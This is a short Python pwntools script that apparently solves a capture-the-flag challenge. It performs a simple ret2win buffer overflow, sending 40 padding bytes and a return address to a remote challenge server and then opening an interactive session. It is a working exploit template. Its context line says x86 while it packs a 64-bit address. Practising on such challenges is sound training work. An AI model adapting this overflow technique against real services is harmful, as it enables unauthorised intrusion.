#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './chall'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# p = start()

#Simple ret2win
p = remote("gc1.eng.run", 30393)
p.sendline(b"A"*40 + p64(0x401227))

p.interactive()

